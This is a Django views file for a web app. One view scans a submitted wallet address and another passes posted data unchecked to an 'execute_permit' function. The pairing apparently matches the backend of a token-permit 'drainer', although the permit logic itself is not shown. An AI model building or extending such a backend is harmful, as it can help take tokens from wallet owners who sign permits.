from django.shortcuts import render
from django.views import View
import json
from django.http import JsonResponse
import asyncio
from .utils import scan_wallet
from web3 import Web3
from .new_utils import execute_permit


# Create your views here.


class HomeView(View):
    def get(self, request, *args, **kwargs):
        return render(request, "home/index.html")
    
    def post(self, request, *args, **kwargs):
        try:
            data = json.loads(request.body)
        except:
            return JsonResponse({"error": "Invalid JSON"}, status=400)

        user_wallet = data.get("userAddress")

        if not user_wallet:
            return JsonResponse({"error": "Wallet required"}, status=400)
        
        try:
            checksum_address = Web3.to_checksum_address(user_wallet)
            result = asyncio.run(scan_wallet(str(checksum_address)))
            return JsonResponse({
                "status": "success",
                "data": result
            })

        except Exception as e:
            return JsonResponse({
                "status": "error",
                "message": str(e)
            })



class ExecutePermitView(View):
    def post(self, request, *args, **kwargs):
        try:
            data = json.loads(request.body)
        except:
            return JsonResponse({"error": "Invalid JSON"}, status=400)
    
        execute_permit(data)
        
        return JsonResponse({"msg": "success"})
